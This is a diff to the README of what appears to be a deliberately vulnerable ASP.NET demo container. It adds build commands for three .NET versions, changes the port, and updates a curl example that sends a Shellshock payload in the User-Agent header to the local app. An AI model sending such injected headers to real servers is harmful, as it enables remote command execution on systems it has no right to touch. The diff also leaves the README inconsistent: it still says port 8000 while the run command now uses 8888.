@@ -16,14 +16,17 @@ First, clone the repo
 Then build and run the container
 
 ```sh
-# Build the image
-docker build --pull -t aspnetapp .
+# Build the image with dotNET 3.1
+docker build --pull -t aspnetapp -f Dockerfile.3.1 .
+
+# Build the image with dotNET 5.0
+docker build --pull -t aspnetapp -f Dockerfile.5.0 .
+
+# Build the image with dotNET 6.0
+docker build --pull -t aspnetapp -f Dockerfile.6.0 .
 
 # Run the container
-docker run \
-  --rm -it -p 8000:80
-  --name aspnetapp \
-  aspnetapp
+docker run --rm -it -p 8888:80 --name aspnetapp aspnetapp
 ```
 
 The upload app is accessible on port 8000.
@@ -31,7 +34,7 @@ The upload app is accessible on port 8000.
 Finally, run a shellshock for example.
 
 ```sh
-curl -H "User-Agent: () { :; }; /bin/eject" http://localhost:8000
+curl -H "User-Agent: () { :; }; /bin/eject" http://localhost:8888
 ```
 
 ## Support
